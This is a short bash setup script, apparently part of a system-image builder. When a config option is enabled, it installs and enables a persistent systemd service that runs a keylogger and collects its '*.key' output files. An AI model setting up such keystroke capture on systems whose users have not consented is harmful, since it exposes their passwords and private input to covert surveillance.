#!/bin/bash
#
# Setup for keylogger
#

function keylogger()
{
  # config->keylogger
  if [ "$(config_value "keylogger")" = "True" ]; then

    c="$(config_value "keylogger_path")"
    path="${c:-"/home/user/ScreenCapture"}"

    # create keylogger systemd daemon
    cat <<EOF2 >"${initrd}/newroot/etc/systemd/system/keylogger.service"
[Unit]
Description=keylogger

[Service]
Type=simple
WorkingDirectory=${path}
ExecStart=/usr/bin/keylogger
ExecStop=/bin/bash -c 'kill \$1; tail --pid=\$1 -f /dev/null' sh \$MAINPID
ExecStopPost=/usr/bin/launch keylogger
Restart=always
RestartSec=10

[Install]
WantedBy=graphical.target
EOF2

    chroot ${initrd}/newroot mkdir "${path}"
    chroot ${initrd}/newroot systemctl enable keylogger.service

    # setup the launch timer
    cat <<EOF3 >>"${initrd}/newroot/etc/launch.conf"
# keylogger
name+=("keylogger")
threshold+=("0m")
path+=("${path}")
hardlink+=("")
move+=("*.key")
remove+=("")
log+=("")
chunk+=("10")

EOF3

  fi

}
